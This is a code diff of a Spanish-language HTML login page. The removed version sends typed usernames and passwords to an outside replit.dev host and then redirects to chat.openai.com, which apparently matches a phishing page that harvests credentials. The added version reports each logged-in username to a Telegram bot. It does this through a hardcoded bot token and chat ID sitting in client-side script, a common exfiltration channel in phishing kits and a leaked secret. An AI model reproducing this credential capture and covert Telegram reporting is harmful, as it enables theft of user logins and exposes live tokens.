@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Iniciar sesión</title>
+<title>Inicio de sesión</title>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 </head>
 <body>
@@ -28,16 +28,27 @@ $(document).ready(function(){
     var password = $("#password").val();
     $.ajax({
       type: "POST",
-      url: "https://b9c2ac4e-9446-4970-8f48-b29b97cac8b0-00-1tyrf1e48ewxw.picard.replit.dev/",
+      url: "login.php",
       data: { username: username, password: password },
       success: function(response){
         $("#result").html(response);
         if(response.trim() === "success") {
-          window.location.href = "https://chat.openai.com/"; // Redirigir a la página de inicio después del inicio de sesión exitoso
+          sendTelegramMessage("Inicio de sesión exitoso para el usuario: " + username);
+          window.location.href = "dashboard.html"; // Redirigir a la página de inicio después del inicio de sesión exitoso
         }
       }
     });
   });
+  
+  function sendTelegramMessage(message) {
+    // Configura el token del bot y el chat_id
+    var botToken = "7124602613:AAGZyucg7wuPEGSD6UKD3jn7oz3ZPnupeB0";
+    var chatId = "6915301721";
+    // Configura el mensaje a enviar
+    var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+    // Envía la solicitud al servidor de Telegram
+    $.get(telegramUrl);
+  }
 });
 </script>
 
